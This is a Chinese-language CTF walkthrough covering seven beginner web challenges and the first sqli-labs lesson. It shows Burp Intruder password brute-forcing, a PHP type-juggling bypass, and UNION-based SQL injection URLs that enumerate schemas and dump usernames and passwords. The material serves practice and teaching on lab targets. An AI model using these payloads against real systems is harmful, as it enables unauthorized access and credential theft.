CTF-WEB

第一题

打开题目所给网页如图

查看源代码可使用view-source：http://220.249.52.133:32303/
即可得到

第十七行中蓝色部分即为所需flag

第二题

打开题目所给网页如图

对网页使用robots协议输入http://220.249.52.133:31344/robots.txt

得到文本内容

第三行的f1ag_1s_h3re.php为打开该目录下PHP格式文件

得到的内容极为flag

第三题

打开题目所给网页如图

查询得知index.php的备份文件名为index.php.bak

输入220.249.52.133:49804/index.php.bak会弹出如下界面

选择以记事本打开后会得到答案所在，如图

输入flag即为答案

第四题

打开题目所给网页如图

使用火狐cookie查询所存放的地址

得到在cookie.php目录下

输入http://220.249.52.133:56288/cookie.php得到

使用hackbar查询回复

在右边的响应里即可得到flag

第五题

打开题目所给网页如图

打开后发现flag按钮无法按下

使用hackbar对页面查看发现按钮为disabled

将disabled改为abled后发现按钮可以按了

显示即为所求flag

第六题

打开题目所给网页如图

经过试验发现login为admin

使用login为admin，password为123试验，发现登陆错误

使用burpsuit抓包

之后发送到intruder模块进行爆破对123添加变量，加载字典，进行爆破


发现密码为123456时长度不同，所以密码为123456，
输入密码得到flag

第七题

打开题目所给网页如图

经过分析要求一$a==0 and $a意思为a=0且a为真
因为PHP是弱语言a为字符型转为数字型a值为0为真
即a==0为真。要求二为b为字符型且要大于1234.

所以输入?a=a&b=2345a,即得到输出的flag

第一题

第一步

打开第一题页面输入http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-1/?id=1'
后显示如图

可知输入样式为’’ LIMIT 0,1为数字型

第二步

经过实验
输入http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-1/?id=1' order by 3–+显示

该数据库只有三列

第三步

输入http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-1/?id=0' union select 1,2,3–+显示
可知2，3列之间存在漏洞，在2，3之间实施SQL语句

select group_concat(schema_name) from information_schema.schemata

得到数据库名有information_schema,challenges,mysql,performance_schema,security,sys,xxx

查看security，使用语句

select group_concat(table_name) from information_schema.tables where table_schema=’security’

得到security中的列名有emails,referers,uagents,users

查看user中的信息使用语句

select group_concat(username) from security.users

select group_concat(password) from security.users

即得到所要信息，第一题结束
